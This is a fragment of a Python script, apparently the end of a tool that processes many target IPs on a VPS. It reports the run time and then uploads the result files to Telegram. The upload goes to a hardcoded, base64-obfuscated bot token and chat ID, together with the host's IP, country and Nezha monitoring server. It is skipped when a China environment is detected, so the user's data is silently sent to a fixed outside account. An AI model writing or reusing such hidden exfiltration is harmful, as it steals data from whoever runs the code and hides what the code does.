            print("\n>>> 🛑 用户中断操作（Ctrl+C），准备清理临时文件...")
            interrupted = True
    except SystemExit as e:
            if str(e) not in ["0", "1"]:
                print(f"\n脚本因故中止: {e}")
            interrupted = True
    except EOFError:
            print("\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
            interrupted = True
    finally:
            clean_temp_files(TEMPLATE_MODE)
            end = time.time()
            cost = int(end - start)
            
            vps_ip, vps_country = get_vps_info()
            nezha_server = get_nezha_server()
            
            run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
            if interrupted:
                    print(f"\n=== 🛑 脚本已被中断，中止前共运行 {run_time_str} ===")
            else:
                    print(f"\n=== 🎉 全部完成！总用时 {run_time_str} ===")

            def send_to_telegram(file_path, bot_token, chat_id, **kwargs):
                    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                            print(f"⚠️  Telegram 上传跳过：文件 {file_path} 不存在或为空")
                            return

                    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                    caption = (
                        f"VPS: {kwargs.get('vps_ip', 'N/A')} ({kwargs.get('vps_country', 'N/A')})\n"
                        f"总目标数: {kwargs.get('total_ips', 0)}\n"
                        f"总用时: {kwargs.get('run_time_str', 'N/A')}\n"
                    )
                    if kwargs.get('nezha_server') != "N/A":
                        caption += f"哪吒Server: {kwargs.get('nezha_server')}\n"
                    caption += f"任务结果: {os.path.basename(file_path)}"
                    
                    with open(file_path, "rb") as f:
                            files = {'document': f}
                            data = {'chat_id': chat_id, 'caption': caption}
                            try:
                                    response = requests.post(url, data=data, files=files, timeout=60)
                                    if response.status_code == 200:
                                            print(f"✅ 文件 {file_path} 已发送到 Telegram")
                                    else:
                                            print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                            except Exception as e:
                                    print(f"❌ 发送到 TG 失败：{e}")
            
            BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
            CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
            
            BOT_TOKEN, CHAT_ID = BOT_TOKEN_B64, CHAT_ID_B64
            try:
                BOT_TOKEN = base64.b64decode(BOT_TOKEN_B64).decode('utf-8')
                CHAT_ID = base64.b64decode(CHAT_ID_B64).decode('utf-8')
            except (binascii.Error, UnicodeDecodeError):
                print("\n" + "="*50)
                print("⚠️  警告：Telegram 的 BOT_TOKEN 或 CHAT_ID 未经 Base64 加密。")
                print("   脚本仍可工作，但建议对代码中的凭据进行加密以增强安全性。")
                print("="*50)

            if is_china_env:
                print("\n🇨🇳 检测到国内环境，已禁用 Telegram 上传功能。")
            elif BOT_TOKEN and CHAT_ID:
                files_to_send = []
                final_txt_file = f"{prefix}-{time_str}.txt"
                final_xlsx_file = f"{prefix}-{time_str}.xlsx"
                if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
                if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
                
                for f_path in files_to_send:
                    print(f"\n📤 正在将 {f_path} 上传至 Telegram ...")
                    send_to_telegram(f_path, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, 
                                     nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
